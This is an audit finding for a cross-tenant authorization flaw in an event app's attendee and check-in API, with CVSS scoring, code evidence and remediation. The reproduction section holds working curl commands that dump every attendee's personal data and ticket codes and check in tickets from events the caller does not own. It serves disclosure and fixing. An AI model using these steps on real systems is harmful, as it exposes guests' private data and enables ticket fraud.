# H-01 — Cross-tenant attendee read and check-in (broken object-level authorization)

| | |
| --- | --- |
| **Severity** | **High** |
| **CVSS 3.1** | 7.1 — `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N` |
| **CWE** | CWE-639 (Authorization Bypass Through User-Controlled Key), CWE-284 (Improper Access Control) |
| **Component** | `GET /api/attendees`, `POST /api/checkin` |
| **Affected code** | `server/src/index.js:272-306`, `server/src/index.js:241-250`, `server/src/auth.js:113-118` |
| **Status** | Read path **confirmed live**; check-in write path confirmed by code review |

## Summary

The attendee list is meant to be scoped: staff see only their assigned event, organizers see only events they created, and the owner sees everything. That is true for `staff`, but **not for `organizer`**.

`/api/attendees` computes `staffEventId` only when the caller is `staff` (`index.js:274`). For an organizer it falls back to the caller-supplied `req.query.eventId`, and if no `eventId` is supplied it runs the query with **no `WHERE` clause** (`index.js:283-290`). There is no ownership check anywhere on the route — only `requireUser` and `requireApproved` (`index.js:272`).

The same gap exists on the write side: `/api/checkin` scopes only `staff` (`index.js:241-250`). An organizer or owner can check in a ticket from **any** event, not just their own.

## Impact

An approved organizer can:

- Read **every attendee at every event**: full name, email, phone, organization, event, check-in time, and the **8-character ticket code**.
- Read aggregate registration/check-in counts for every event.
- Enumerate every event in the system (the `events` array in the response is not scoped either).
- Check in — or re-check in — attendees at events they do not own.
- Use the leaked ticket codes to admit people, duplicate tickets, or deny legitimate check-ins.

Because the ticket code is the bearer credential for check-in, reading the attendee list is equivalent to reading every ticket. The response is also limited to 1,000 rows per request, which is enough to exfiltrate a typical event in one call.

This is a multi-tenant authorization failure. Organizer accounts are lower-trust than the owner but still have access to other organizers' guest PII.

## Preconditions

- A valid session for a user with `role = 'organizer'` and `approval_status = 'approved'`.
- Organizer accounts are created by the owner via `POST /api/admin/users` (`admin.js:435-468`). An organizer who owns **zero** events is sufficient.

## Reproduction

The following was executed against the running instance. Replace host/credentials with your own. Use a disposable organizer.

```bash
BASE=http://localhost:4000

# 1. Sign in as the owner and create a disposable organizer.
curl -sS -c owner.jar -X POST "$BASE/api/admin/login" \
  -H 'content-type: application/json' \
  -d '{"email":"owner@example.com","password":"<owner-password>"}'

curl -sS -b owner.jar -X POST "$BASE/api/admin/users" \
  -H 'content-type: application/json' \
  -d '{"name":"Audit Organizer","email":"audit-org@example.com","password":"Audit-Pass-123"}'

# 2. Sign in as the organizer. This account owns no events.
curl -sS -c org.jar -X POST "$BASE/api/admin/login" \
  -H 'content-type: application/json' \
  -d '{"email":"audit-org@example.com","password":"Audit-Pass-123"}'

# 3. Dump every attendee across every tenant (no eventId).
curl -sS -b org.jar "$BASE/api/attendees" \
  | jq '{events: (.events|length), attendees: (.attendees|length), stats, first: .attendees[0]}'

# 4. Or target a specific event that the organizer does not own.
curl -sS -b org.jar "$BASE/api/attendees?eventId=2" \
  | jq '{events: (.events|length), attendees: (.attendees|length)}'
```

Observed during the audit (values summarised, no PII reproduced):

```text
temp organizer created: 201
temp organizer login: 200
GET /api/attendees (no eventId): 200
  eventsLeaked: 1
  attendeesLeaked: 5
  stats: { total: 5, checkedIn: 3 }
GET /api/attendees?eventId=2 (not owned): 200
  eventsLeaked: 1
  attendeesLeaked: 5
```

The organizer owned zero events yet received all 5 attendees of the owner's event, including their ticket codes.

Control check — the same organizer **cannot** edit that event, which shows the inconsistency:

```bash
curl -sS -o /dev/null -w '%{http_code}\n' -b org.jar -X PATCH "$BASE/api/admin/events/2" \
  -H 'content-type: application/json' \
  -d '{"name":"x","title":"x","startsAt":"2030-01-01T09:00","status":"open"}'
# 404  (ownership is enforced here, but not on /api/attendees)
```

Write-side reproduction (do this only on test data — it mutates a real attendee):

```bash
CODE=$(curl -sS -b org.jar "$BASE/api/attendees?eventId=2" | jq -r '.attendees[0].code')
curl -sS -b org.jar -X POST "$BASE/api/checkin" \
  -H 'content-type: application/json' \
  -d "{\"code\":\"$CODE\"}"
# {"status":"checked-in"|"already", ...} even though the event is not the organizer's
```

## Evidence

`server/src/index.js:272-306`:

```js
app.get('/api/attendees', requireUser, requireApproved, async (req, res) => {
  const requested = Number(req.query.eventId) || null;
  const staffEventId = req.user.role === 'staff' ? req.user.staffEvent?.id : null;
  if (req.user.role === 'staff' && !staffEventId) {
    return res.status(403).json({ error: 'No event is assigned to your account.' });
  }
  const eventId = staffEventId ?? requested;

  const [events] = staffEventId
    ? await pool.execute('SELECT id, name, starts_at FROM events WHERE id = ?', [staffEventId])
    : await pool.query('SELECT id, name, starts_at FROM events ORDER BY starts_at DESC');
  const [rows] = await pool.execute(
    `SELECT a.*, e.name AS event_name
       FROM attendees a JOIN events e ON e.id = a.event_id
      ${eventId ? 'WHERE a.event_id = ?' : ''}
      ORDER BY a.created_at DESC
      LIMIT 1000`,
    eventId ? [eventId] : [],
  );
  // ...
  res.json({
    events: ...,
    attendees: rows.map(toAttendee),
    stats: { total: Number(stats.total), checkedIn: Number(stats.checkedIn) },
  });
});
```

`server/src/index.js:241-250` (check-in scoping only applies to staff):

```js
if (req.user.role === 'staff') {
  if (!req.user.staffEvent) { ... }
  if (row.event_id !== req.user.staffEvent.id) { ... }
}
```

`server/src/auth.js:113-118` — `requireApproved` checks only approval status, not role or ownership:

```js
export function requireApproved(req, res, next) {
  if (req.user.approvalStatus !== 'approved') {
    return res.status(403).json({ error: 'Your staff account is waiting for approval.' });
  }
  next();
}
```

## Root cause

The route models authorization as "staff are scoped, everyone else is trusted." That assumption holds for the owner but not for organizers, who are separate tenants. The `eventId` query parameter is treated as an object identifier without an ownership check (classic IDOR), and the no-`eventId` branch silently means "all events."

## Remediation

1. Add a single helper and use it on every event-scoped route:

   ```js
   // server/src/auth.js or a new authz.js
   export async function canAccessEvent(user, eventId) {
     if (user.role === 'owner') return true;
     if (user.role === 'staff') return user.staffEvent?.id === eventId;
     if (user.role === 'organizer') {
       const [rows] = await pool.execute(
         'SELECT 1 FROM events WHERE id = ? AND created_by = ?',
         [eventId, user.id],
       );
       return rows.length > 0;
     }
     return false;
   }
   ```

2. In `GET /api/attendees`:
   - Resolve the allowed event IDs first: owner → all; organizer → `SELECT id FROM events WHERE created_by = ?`; staff → their assigned event.
   - If `eventId` is supplied, return **404** unless it is in the allowed set.
   - If no `eventId` is supplied, list only allowed events and only their attendees. Never run the unscoped query for a non-owner.
3. In `POST /api/checkin`, replace the `role === 'staff'` block with a `canAccessEvent(req.user, row.event_id)` check for **all** roles except owner.
4. Return 404 (not 403) for events the caller cannot see, to avoid confirming event IDs.
5. Add regression tests:
   - Organizer B cannot read or check in event A (expect 404).
   - Organizer B with no events gets an empty list, not all events.
   - Staff still see only their event.
   - Owner still sees all events.
6. As defense-in-depth, stop returning `phone` and `code` in the list unless the UI needs them; add pagination instead of `LIMIT 1000`.

## Verification

After the fix, repeat the reproduction above. The organizer should receive `404` for `?eventId=<other>`, an empty or own-only list for no `eventId`, and `403/404` on check-in for another organizer's event. The owner and the assigned staff account must still work.

## References

- OWASP ASVS 5.0 V8.2 / V8.3 — object-level and function-level authorization
- OWASP Authorization Cheat Sheet — enforce at the data layer, deny by default
- CWE-639, CWE-284
